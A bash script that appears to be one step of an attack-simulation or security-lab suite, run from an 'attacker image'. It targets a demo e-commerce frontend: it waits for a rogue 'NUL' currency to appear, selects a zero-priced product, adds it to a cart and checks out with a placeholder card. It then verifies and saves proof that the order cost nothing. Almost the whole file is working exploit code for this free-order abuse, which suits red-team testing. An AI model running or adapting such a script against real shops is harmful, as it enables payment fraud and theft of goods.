#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

require_tools curl jq

log() {
  printf '[KC3-310] %s\n' "$*" >&2
}

OUT_DIR="${DATA_PATH:-/tmp/KCData}/KC3"
mkdir -p "$OUT_DIR"

CURRENCY_CODE="${FREE_ORDER_CURRENCY:-NUL}"
USER_ID="${FREE_ORDER_USER_ID:-kc3-free-order-$(date +%s)-$$}"
QUANTITY="${FREE_ORDER_QUANTITY:-1}"

CURRENCIES_FILE="$OUT_DIR/free-order-currencies.json"
PRODUCTS_FILE="$OUT_DIR/free-order-products.json"
CART_FILE="$OUT_DIR/free-order-cart.json"
ORDER_FILE="$OUT_DIR/free-order.json"

docker_metallb_candidate() {
  command -v ip >/dev/null 2>&1 || return 0
  local src_ip
  src_ip="$(
    ip -4 route get 1.1.1.1 2>/dev/null \
      | awk '{for (i=1; i<=NF; i++) if ($i == "src") {print $(i+1); exit}}'
  )"
  if [[ "$src_ip" =~ ^([0-9]+\.[0-9]+\.[0-9]+)\.[0-9]+$ ]]; then
    printf 'http://%s.200:8080\n' "${BASH_REMATCH[1]}"
  fi
}

frontend_candidates() {
  if [[ -n "${FRONTEND_BASE_URL:-}" ]]; then
    printf '%s\n' "${FRONTEND_BASE_URL%/}"
  fi
  if [[ -n "${FRONTEND_PROXY_URL:-}" ]]; then
    printf '%s\n' "${FRONTEND_PROXY_URL%/}"
  fi
  if [[ -n "${FRONTEND_PROXY_IP:-}" ]]; then
    printf 'http://%s:8080\n' "$FRONTEND_PROXY_IP"
  fi
  docker_metallb_candidate
  printf 'http://172.18.0.200:8080\n'
}

select_frontend_base_url() {
  local candidate
  local probe_file="$OUT_DIR/free-order-currencies.probe.json"

  while IFS= read -r candidate; do
    [[ -n "$candidate" ]] || continue
    log "checking frontend candidate ${candidate}"
    if curl -fsS --max-time 5 "${candidate}/api/currency" -o "$probe_file" \
      && jq -e 'type == "array"' "$probe_file" >/dev/null 2>&1; then
      mv "$probe_file" "$CURRENCIES_FILE"
      printf '%s\n' "$candidate"
      return 0
    fi
  done < <(frontend_candidates | awk '!seen[$0]++')

  log "no frontend candidate exposed /api/currency as JSON"
  return 1
}

FRONTEND_BASE_URL="$(select_frontend_base_url)"

log "waiting for currency ${CURRENCY_CODE} on frontend ${FRONTEND_BASE_URL}"
deadline=$((SECONDS + ${FREE_ORDER_CURRENCY_TIMEOUT_SECONDS:-180}))
while (( SECONDS < deadline )); do
  if curl -fsS "${FRONTEND_BASE_URL}/api/currency" -o "$CURRENCIES_FILE"; then
    if jq -e --arg code "$CURRENCY_CODE" 'index($code) != null' "$CURRENCIES_FILE" >/dev/null; then
      break
    fi
  fi
  sleep 3
done

if ! jq -e --arg code "$CURRENCY_CODE" 'index($code) != null' "$CURRENCIES_FILE" >/dev/null 2>&1; then
  log "currency ${CURRENCY_CODE} was not exposed by the frontend"
  exit 1
fi

curl -fsS "${FRONTEND_BASE_URL}/api/products?currencyCode=${CURRENCY_CODE}" -o "$PRODUCTS_FILE"
PRODUCT_ID="$(
  jq -r --arg code "$CURRENCY_CODE" '
    ([.[] | select(.id and .priceUsd.currencyCode == $code and ((.priceUsd.units // 0) == 0) and ((.priceUsd.nanos // 0) == 0))][0].id)
    // (.[0].id // empty)
  ' "$PRODUCTS_FILE"
)"
if [[ -z "$PRODUCT_ID" || "$PRODUCT_ID" == "null" ]]; then
  log "no product returned by frontend in currency ${CURRENCY_CODE}"
  exit 1
fi

log "adding product ${PRODUCT_ID} to cart for user ${USER_ID}"
CART_BODY="$(
  jq -n \
    --arg user_id "$USER_ID" \
    --arg product_id "$PRODUCT_ID" \
    --argjson quantity "$QUANTITY" \
    '{userId: $user_id, item: {productId: $product_id, quantity: $quantity}}'
)"
curl -fsS \
  -X POST \
  -H "Content-Type: application/json" \
  -d "$CART_BODY" \
  "${FRONTEND_BASE_URL}/api/cart?currencyCode=${CURRENCY_CODE}" \
  -o "$CART_FILE"

log "placing checkout order with currency ${CURRENCY_CODE}"
ORDER_BODY="$(
  jq -n \
    --arg user_id "$USER_ID" \
    --arg user_currency "$CURRENCY_CODE" \
    '{
      userId: $user_id,
      userCurrency: $user_currency,
      email: "someone@example.com",
      address: {
        streetAddress: "1600 Amphitheatre Parkway",
        city: "Mountain View",
        state: "CA",
        country: "United States",
        zipCode: "94043"
      },
      creditCard: {
        creditCardNumber: "4432-8015-6152-0454",
        creditCardCvv: 672,
        creditCardExpirationYear: 2030,
        creditCardExpirationMonth: 1
      }
    }'
)"
curl -fsS \
  -X POST \
  -H "Content-Type: application/json" \
  -d "$ORDER_BODY" \
  "${FRONTEND_BASE_URL}/api/checkout?currencyCode=${CURRENCY_CODE}" \
  -o "$ORDER_FILE"

ORDER_ID="$(jq -r '.orderId // empty' "$ORDER_FILE")"
if [[ -z "$ORDER_ID" || "$ORDER_ID" == "null" ]]; then
  log "checkout response did not contain an orderId"
  jq . "$ORDER_FILE" >&2
  exit 1
fi

if ! jq -e --arg code "$CURRENCY_CODE" '
  (.items | length > 0)
  and all(.items[]; .cost.currencyCode == $code and ((.cost.units // 0) == 0) and ((.cost.nanos // 0) == 0))
  and (.shippingCost.currencyCode == $code)
' "$ORDER_FILE" >/dev/null; then
  log "order ${ORDER_ID} completed, but the response does not show zero-cost ${CURRENCY_CODE} items"
  jq . "$ORDER_FILE" >&2
  exit 1
fi

log "order ${ORDER_ID} completed; evidence saved in ${ORDER_FILE}"
